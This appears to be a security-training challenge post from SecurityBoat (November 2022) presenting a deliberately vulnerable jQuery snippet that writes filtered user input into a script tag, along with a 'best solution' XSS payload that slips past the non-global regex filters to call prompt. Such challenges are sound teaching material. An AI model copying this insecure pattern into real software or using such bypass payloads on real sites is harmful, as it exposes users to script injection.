# Static code review for November2022 by SecurityBoat

## Problem

**The task is to spot the vulnerability in the provided static code snippet and trying bypassing it by providing payload to prompt message on the browser**

## Snippet

**Here is the code snippet to solve and perform the attack**

```javascript
<script src='https://code.jquery.com/jquery-3.6.1.min.js'></script>

<script>
  $("#submit").click(function () {
    escape();
  });
  function escape() {
    var searchParam = $("#search").val();
    searchParam = searchParam.replace(/prompt|confirm|print/, 'alert');
    searchParam = searchParam.replace(/[-[\]{}()*+?.,'"\\^$|#\s]/, '');
    $('#result').html('<script>' + searchParam + '<\/script>');
  }
</script>
```

- [Twitter](https://twitter.com/Securityb0at/status/1589987716678422528)
- [linkedIn](https://www.linkedin.com/posts/securityboat_infosec-cybersecurity-bugbounty-activity-6995754446743826432-RUEk?utm_source=share&utm_medium=member_android)
- [Instagram](https://www.instagram.com/p/CktEJFlqTiB/?utm_source=ig_web_copy_link)

## Best Solution

```
var  a = "prompt('duh')"; prompt('pwned');
```

## Write up

[Writeup](https://securityboat.in/spot-the-vulnerability-xss-challenge-simplified/)
